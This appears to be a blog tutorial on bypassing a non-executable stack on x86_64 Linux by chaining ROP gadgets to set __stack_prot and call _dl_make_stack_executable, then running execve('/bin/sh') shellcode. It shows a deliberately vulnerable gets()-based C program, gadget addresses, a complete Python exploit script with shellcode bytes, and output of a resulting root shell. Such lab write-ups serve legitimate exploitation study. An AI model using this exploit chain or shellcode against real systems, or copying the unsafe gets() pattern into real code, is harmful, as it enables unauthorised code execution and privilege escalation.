---
layout: post
title: "[ROP] Ret to Stack"
categories: [pwn]
tags: [pwn, ROP]
description: How to bypass NX/ASLR protections using "ret to Stack" attack on a x64 Linux system.
---

Tools:
1. objdump

Binary protection:
1. Read Only relocations
2. No exec stack
3. No exec heap
4. ASLR

Compilation: Static

Architecture: x86_64

Operating System: Linux (Debian)

# 1. Vulnerable binary
For this exemple, I will take the same program as my last post.
```c
#include <stdio.h>

// gcc main.c -fno-stack-protector -Wl,-z,relro,-z,now,-z,noexecstack -static
int main()
{
  char buf[64];

  gets(buf);  // Never use this function !
  printf("%s", buf);
  return 0;
}
```

I will show you today an other method to exploit a buffer overflow thanks to a ROP. I find this method funny because despite the "no exec stack" protection, it permit to make the stack executable and so, execute a shellcode on it.

# 2. To begin
To do this exploit, we will use the "_dl_make_stack_executable" function.
The function look like that:
```nasm
$ objdump -D a.out | grep -A 20 "<_dl_make_stack_executable>"
000000000045fc30 <_dl_make_stack_executable>:
  45fc30:	48 8b 35 e9 54 25 00 	mov    0x2554e9(%rip),%rsi        # 6b5120 <_dl_pagesize>
  45fc37:	53                   	push   %rbx
  45fc38:	48 89 fb             	mov    %rdi,%rbx
  45fc3b:	48 8b 07             	mov    (%rdi),%rax
  45fc3e:	48 89 f7             	mov    %rsi,%rdi
  45fc41:	48 f7 df             	neg    %rdi
  45fc44:	48 21 c7             	and    %rax,%rdi
  45fc47:	48 3b 05 da 42 25 00 	cmp    0x2542da(%rip),%rax        # 6b3f28 <__libc_stack_end>
  45fc4e:	75 1f                	jne    45fc6f <_dl_make_stack_executable+0x3f>
  45fc50:	8b 15 2a 43 25 00    	mov    0x25432a(%rip),%edx        # 6b3f80 <__stack_prot>
  45fc56:	e8 15 21 fd ff       	callq  431d70 <__mprotect>
  45fc5b:	85 c0                	test   %eax,%eax
  45fc5d:	75 17                	jne    45fc76 <_dl_make_stack_executable+0x46>
  45fc5f:	48 c7 03 00 00 00 00 	movq   $0x0,(%rbx)
  45fc66:	83 0d a3 54 25 00 01 	orl    $0x1,0x2554a3(%rip)        # 6b5110 <_dl_stack_flags>
  45fc6d:	5b                   	pop    %rbx
  45fc6e:	c3                   	retq   
  45fc6f:	b8 01 00 00 00       	mov    $0x1,%eax
  45fc74:	5b                   	pop    %rbx
  45fc75:	c3                   	retq   
```

We can see two important things. First, the function take "\_\_libc\_stack_end" as single parameter and it encapsulate the mprotect function. (cf man mprotect) The third parameter of the mprotect function determine the memory access. (PROT_NONE \| PROT_READ \| PROT_WRITE \| PROT_EXEC) By default, the value is set to "O" for none access, so our goal will be to set this value to "7". (7 == rwx) To do this, we need to change the value of "\_\_stack\_prot" because it's the variable used by mprotect as third parameter.

So our payload will look like this:
padding + set \_\_stack\_prot to 7 + set RDI to \_\_libc\_stack\_end + execute \_dl\_make\_stack\_executable + push shellcode

# 3. The payload
I will not explain how to find the gadget, take a look at my last post if you don't now how to do it.
First, the \_\_stack\_prot address:
```bash
$ objdump -D a.out | grep "__stack_prot"
00000000006b3f80 <__stack_prot>:
```

Great. So our payload begin will be:
```python
payload = 'A'*72 # padding

payload += pack("<Q", 0x00000000004016b7) # pop rsi ; ret
payload += pack("<Q", 0x00000000006b3f80) # @ __stack_prot
payload += pack("<Q", 0x00000000004314ad) # pop rax ; ret
payload += pack("<Q", 0x0000000000000007) # PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE
payload += pack("<Q", 0x000000000045f491) # mov QWORD PTR [rsi], rax ; ret
```

We also will need the address of the "\_\_libc\_stack\_end" variable and "\_dl\_make\_stack\_executable" function.
```bash
$ objdump -D a.out|egrep "__libc_stack_end|_dl_make_stack_executable"
...
000000000045fc30 <_dl_make_stack_executable>:
...
00000000006b3f28 <__libc_stack_end>:
...
```

And the payload part look like:
```python
payload += pack("<Q", 0x000000000040159b) # pop rdi ; ret
payload += pack("<Q", 0x00000000006b3f28) # @ __libc_stack_end
payload += pack("<Q", 0x000000000045fc30) # @ _dl_make_stack_executable
```

Well, we only have left to push the shellcode and test it ! 
The shellcode is a simply execve("/bin/sh", ...) on 30 bytes.
To push the shellcode:
```python
payload += pack("<Q", 0x000000000040fd8c) # push rsp ; ret
payload += shellcode
```

# 4. Exploitation
The whole payload look like:
```python
#!/usr/bin/env python2.7

from struct import pack

#
# Shellcode execve("/bin/sh", ["/bin/sh"], NULL) (30 bytes)
#

shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"

payload = 'A'*72 # padding

payload += pack("<Q", 0x00000000004016b7) # pop rsi ; ret
payload += pack("<Q", 0x00000000006b3f80) # @ __stack_prot
payload += pack("<Q", 0x00000000004314ad) # pop rax ; ret
payload += pack("<Q", 0x0000000000000007) # PROT_EXEC|PROT_READ|PROT_WRITE|PROT_NONE
payload += pack("<Q", 0x000000000045f491) # mov QWORD PTR [rsi], rax ; ret

payload += pack("<Q", 0x000000000040159b) # pop rdi ; ret
payload += pack("<Q", 0x00000000006b3f28) # @ __libc_stack_end
payload += pack("<Q", 0x000000000045fc30) # @ _dl_make_stack_executable

payload += pack("<Q", 0x000000000040fd8c) # push rsp ; ret
payload += shellcode

print payload
```

The result is:
```bash
$ (python2.7 rop.py; cat) | ./a.out
id
uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

Done.
